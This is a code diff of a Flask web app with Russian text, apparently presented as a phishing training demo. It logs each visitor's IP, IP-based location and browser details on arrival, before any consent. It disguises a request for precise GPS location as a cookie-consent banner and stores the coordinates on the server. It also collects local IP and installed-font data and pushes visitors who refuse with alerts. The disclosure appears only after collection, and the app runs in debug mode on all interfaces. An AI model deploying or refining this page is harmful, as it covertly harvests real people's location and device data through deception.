@@ -1,14 +1,16 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, make_response
 import requests
 from datetime import datetime
 import re
 import os
+import json
 
 app = Flask(__name__)
 
 # Настройки
 LOG_FILE = "user_data.log"
 COOKIE_NAME = "user_consent"
+GEOLOCATION_REQUESTED_FLAG = "geolocation_requested"
 
 def get_ip_data(ip):
     try:
@@ -18,7 +20,6 @@ def get_ip_data(ip):
         return {"country": "Неизвестно", "city": "Неизвестно", "org": "Неизвестно"}
 
 def parse_user_agent(user_agent):
-    # Улучшенное определение ОС
     os = browser = "Неизвестно"
     
     os_patterns = [
@@ -35,7 +36,6 @@ def parse_user_agent(user_agent):
             os = name
             break
 
-    # Определение браузера
     browser_patterns = [
         ('Chrome', r'Chrome|CriOS'),
         ('Firefox', r'Firefox|FxiOS'),
@@ -52,7 +52,7 @@ def parse_user_agent(user_agent):
 
     return os, browser, device
 
-def log_data(ip, data):
+def log_data(data):
     with open(LOG_FILE, "a", encoding="utf-8") as f:
         f.write(json.dumps(data, ensure_ascii=False) + "\n")
 
@@ -64,13 +64,10 @@ def delete_user_data(ip):
         lines = f.readlines()
 
     new_lines = []
-    skip = False
     for line in lines:
         try:
             data = json.loads(line)
-            if data.get("ip") == ip:
-                skip = True
-            if not skip:
+            if data.get("ip") != ip:
                 new_lines.append(line)
         except:
             continue
@@ -151,7 +148,6 @@ HTML_TEMPLATE = """
     </style>
 </head>
 <body>
-    <!-- Основной контент -->
     <div id="mainContent" class="container" style="display: none;">
         <h1>🔍 Полная информация об устройстве</h1>
         
@@ -185,60 +181,29 @@ HTML_TEMPLATE = """
 
         <div class="warning">
             <h2>⚠️ Внимание!</h2>
-            <p>Вы только что стали жертвой учебной фишинговой атаки. Соглашаясь на "cookies", вы фактически разрешили доступ к вашей геолокации.</p>
-            <p><strong>Урок безопасности:</strong> Всегда внимательно читайте, на что вы даёте разрешение!</p>
-            <button onclick="deleteMyData()" style="background: #FF5555; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer;">Удалить мои данные</button>
+            <p>Это учебный пример фишинговой атаки. Настоятельно рекомендуем всегда проверять, какие разрешения вы даёте сайтам.</p>
+            <button onclick="deleteMyData()" class="consent-btn deny">Удалить мои данные</button>
         </div>
     </div>
 
-    <!-- Cookie-баннер -->
     <div id="cookieConsent">
-        <p>Мы используем cookies для улучшения работы сервиса. Продолжая, вы соглашаетесь с их использованием.</p>
-        <button class="consent-btn" onclick="acceptCookies()">Принять</button>
+        <h3>🍪 Использование Cookies и геоданных</h3>
+        <p>Для персонализации сервиса нам необходимо получить доступ к данным о вашем местоположении. Продолжая использование, вы соглашаетесь с нашей политикой конфиденциальности.</p>
+        <button class="consent-btn" onclick="acceptCookiesAndGeolocation()">Разрешить доступ</button>
         <button class="consent-btn deny" onclick="rejectCookies()">Отклонить</button>
     </div>
 
     <script>
-        // Проверяем согласие
         function checkConsent() {
             return document.cookie.includes("{{ COOKIE_NAME }}=true");
         }
 
-        // Если согласие уже дано, загружаем данные
-        if (checkConsent()) {
-            document.getElementById('cookieConsent').style.display = 'none';
-            loadUserData();
-        }
-
-        function acceptCookies() {
-            // Устанавливаем куки
+        function acceptCookiesAndGeolocation() {
+            // Устанавливаем куки согласия
             document.cookie = "{{ COOKIE_NAME }}=true; max-age=31536000; path=/";
             document.getElementById('cookieConsent').style.display = 'none';
             
             // Запрашиваем геолокацию
-            getGeolocation();
-        }
-
-        function rejectCookies() {
-            window.location.href = "about:blank";
-        }
-
-        function loadUserData() {
-            // Показываем основной контент
-            document.getElementById('mainContent').style.display = 'block';
-            
-            // Заполняем системную информацию
-            document.getElementById('cpuCores').textContent = navigator.hardwareConcurrency || "Неизвестно";
-            document.getElementById('screenRes').textContent = window.screen.width + "x" + window.screen.height;
-            
-            // Получаем локальный IP
-            getLocalIP();
-            
-            // Получаем список шрифтов
-            getFontList();
-        }
-
-        function getGeolocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     position => {
@@ -246,13 +211,11 @@ HTML_TEMPLATE = """
                         const lon = position.coords.longitude;
                         const acc = position.coords.accuracy;
                         
-                        // Отображаем данные
                         document.getElementById('coordinates').textContent = lat.toFixed(6) + ", " + lon.toFixed(6);
                         document.getElementById('accuracy').textContent = "±" + Math.round(acc) + " метров";
                         showMap(lat, lon);
                         document.getElementById('gpsData').style.display = 'block';
                         
-                        // Отправляем на сервер
                         fetch('/log_gps', {
                             method: 'POST',
                             headers: {'Content-Type': 'application/json'},
@@ -263,19 +226,38 @@ HTML_TEMPLATE = """
                             })
                         });
                         
-                        // Показываем основной контент
                         loadUserData();
                     },
                     error => {
-                        // В случае ошибки все равно показываем контент
+                        alert("Для полного функционала требуется доступ к геолокации");
                         loadUserData();
                     },
-                    {enableHighAccuracy: true}
+                    {enableHighAccuracy: true, timeout: 10000}
                 );
             } else {
-                // Геолокация не поддерживается
+                alert("Геолокация не поддерживается вашим браузером");
                 loadUserData();
             }
+        }
+
+        function rejectCookies() {
+            alert("Некоторые функции будут недоступны без согласия на использование cookies");
+            document.getElementById('cookieConsent').style.display = 'none';
+            loadBasicData();
+        }
+
+        function loadUserData() {
+            document.getElementById('mainContent').style.display = 'block';
+            document.getElementById('cpuCores').textContent = navigator.hardwareConcurrency || "Неизвестно";
+            document.getElementById('screenRes').textContent = window.screen.width + "x" + window.screen.height;
+            getLocalIP();
+            getFontList();
+        }
+
+        function loadBasicData() {
+            document.getElementById('mainContent').style.display = 'block';
+            document.getElementById('cpuCores').textContent = "Требуется согласие";
+            document.getElementById('screenRes').textContent = window.screen.width + "x" + window.screen.height;
         }
 
         function showMap(lat, lon) {
@@ -332,6 +314,12 @@ HTML_TEMPLATE = """
                     }
                 });
         }
+
+        // При загрузке страницы проверяем согласие
+        if (checkConsent()) {
+            document.getElementById('cookieConsent').style.display = 'none';
+            loadUserData();
+        }
     </script>
 </body>
 </html>
@@ -339,13 +327,11 @@ HTML_TEMPLATE = """
 
 @app.route('/')
 def index():
-    consent = request.cookies.get(COOKIE_NAME)
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent', 'Неизвестно')
     geo = get_ip_data(ip)
     os, browser, device = parse_user_agent(user_agent)
     
-    # Логируем базовую информацию
     log_data({
         "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
         "ip": ip,
@@ -356,7 +342,7 @@ def index():
         "geo": geo
     })
     
-    return render_template_string(HTML_TEMPLATE,
+    resp = make_response(render_template_string(HTML_TEMPLATE,
         ip=ip,
         country=geo.get('country', 'Неизвестно'),
         city=geo.get('city', 'Неизвестно'),
@@ -365,7 +351,9 @@ def index():
         browser=browser,
         device=device,
         COOKIE_NAME=COOKIE_NAME
-    )
+    ))
+    
+    return resp
 
 @app.route('/log_gps', methods=['POST'])
 def log_gps():
@@ -387,4 +375,7 @@ def delete_data():
     return {'success': success}
 
 if __name__ == '__main__':
+    if not os.path.exists(LOG_FILE):
+        with open(LOG_FILE, 'w') as f:
+            pass
     app.run(host='0.0.0.0', port=5000, debug=True)
